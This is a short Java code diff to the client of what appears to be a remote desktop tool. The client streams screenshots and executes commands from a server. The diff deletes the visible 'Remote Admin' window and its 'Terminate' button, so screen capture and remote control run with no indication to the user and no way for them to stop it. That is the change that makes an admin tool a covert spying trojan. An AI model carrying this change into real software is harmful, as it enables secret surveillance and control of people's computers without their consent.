@@ -77,38 +77,15 @@ public class ClientInitiator  extends Thread{
             robot = new Robot(gDev);
 
             //draw client gui
-            drawGUI();
             //ScreenSpyer sends screenshots of the client screen
             new ScreenSpyer(socket,robot,rectangle);
             //ServerDelegate recieves server commands and execute them
             new ServerDelegate(socket,robot);
 
-//            Socket socket2 = new Socket(ip, port+1);
-//            new Chat(false,NameDesktop,socket);
 
-        } catch (UnknownHostException ex) {
+        } catch (Exception ex) {
             ex.printStackTrace();
-        } catch (IOException ex) {
-            ex.printStackTrace();
-        } catch (AWTException ex) {
-                ex.printStackTrace();
         }
     }
 
-    private void drawGUI() {
-        JFrame frame = new JFrame("Remote Admin");
-        JButton button= new JButton("Terminate");
-        
-        frame.setBounds(100,100,150,150);
-        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
-        frame.add(button);
-        button.addActionListener( new ActionListener() {
-
-            public void actionPerformed(ActionEvent e) {
-                System.exit(0);
-            }
-        }
-      );
-      frame.setVisible(true);
-    }
 }
